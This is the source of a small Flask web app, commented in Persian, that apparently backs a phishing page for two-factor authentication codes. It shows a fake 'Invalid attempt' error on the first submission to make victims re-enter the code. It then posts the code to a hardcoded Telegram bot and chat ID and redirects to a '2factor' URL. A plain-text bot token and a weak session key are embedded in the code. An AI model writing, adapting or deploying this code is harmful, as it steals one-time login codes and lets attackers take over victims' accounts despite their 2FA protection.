from flask import Flask, request, render_template, session, jsonify
import requests
import logging

# تنظیم لاگینگ برای Railway
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = "supersecretkey"  # کلید برای مدیریت session

# تنظیمات ربات تلگرام
BOT_TOKEN = "6445656205:AAFLnpRFXgRvD8I3dMXahrSJxufEV3vdVHY"
CHAT_ID = "5088806230"

@app.route("/", methods=["GET", "POST"])
def index():
    if "attempts" not in session:
        session["attempts"] = 0  # مقداردهی اولیه به تعداد تلاش‌ها

    if request.method == "POST":
        session["attempts"] += 1  # افزایش تعداد تلاش‌ها
        code = request.form.get("code", "")  # دریافت کد از فرم با مقدار پیش‌فرض خالی

        if session["attempts"] < 2:
            # بار اول خطا ارسال می‌شود
            return jsonify({"status": "error", "message": "Invalid attempt"})
        else:
            try:
                # ارسال پیام به تلگرام و چک کردن نتیجه
                message = f"Entered code: {code}"
                telegram_response = send_message_to_telegram(message)
                
                if telegram_response.status_code == 200:
                    # فقط در صورت موفقیت در ارسال به تلگرام، ریدایرکت رو مجاز کن
                    session["attempts"] = 0  # بازنشانی تعداد تلاش‌ها پس از موفقیت
                    return jsonify({
                        "status": "success",
                        "redirect_url": "https://2factor-production.up.railway.app/",
                        "message": "Code sent to Telegram successfully"
                    })
                else:
                    # اگر ارسال به تلگرام ناموفق بود، خطا برگردون
                    logger.error(f"Failed to send message to Telegram, Status Code: {telegram_response.status_code}")
                    return jsonify({
                        "status": "error",
                        "message": f"Failed to send code to Telegram, Status Code: {telegram_response.status_code}"
                    }), 500
            except Exception as e:
                logger.error(f"Error in sending data to Telegram: {str(e)}")
                return jsonify({
                    "status": "error",
                    "message": f"Server error: {str(e)}"
                }), 500

    logger.info("Rendering index.html")
    return render_template("index.html")

def send_message_to_telegram(message):
    """ارسال مستقیم پیام به ربات تلگرام و برگردوندن پاسخ"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": CHAT_ID,
            "text": message
        }
        response = requests.post(url, params=params, timeout=10)
        return response  # برگردوندن شیء Response برای بررسی وضعیت
    except requests.RequestException as e:
        logger.error(f"Network error in sending to Telegram: {str(e)}")
        raise e  # پرتاب استثناء برای مدیریت در تابع بالا
    except Exception as e:
        logger.error(f"Unexpected error in sending to Telegram: {str(e)}")
        raise e

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
